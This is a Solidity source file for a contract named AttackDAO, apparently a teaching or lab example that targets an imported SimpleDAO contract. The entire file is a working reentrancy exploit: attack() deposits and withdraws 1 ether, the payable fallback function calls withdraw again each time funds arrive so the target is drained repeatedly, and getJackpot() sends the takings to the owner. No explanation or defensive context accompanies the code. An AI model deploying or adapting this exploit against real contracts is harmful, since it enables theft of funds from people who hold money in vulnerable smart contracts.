pragma solidity ^0.4.24;

import "./SimpleDAO.sol";

contract AttackDAO {

  SimpleDAO public dao;
  address owner;
  
  constructor (SimpleDAO addr) public payable {
    owner = msg.sender;
    dao = addr;
  }

  function donate(address to, uint val) public {
    dao.donate.value(val)(to);
  }

  function withdraw(uint amount) public {
    dao.withdraw(amount);
  }
  
  function attack() public {
    dao.donate.value(1 ether)(this);
    dao.withdraw(1 ether);
  }

  function getJackpot() public {
    owner.send(this.balance);
  }

  function () public payable {
    dao.withdraw(1 ether);
  }
}
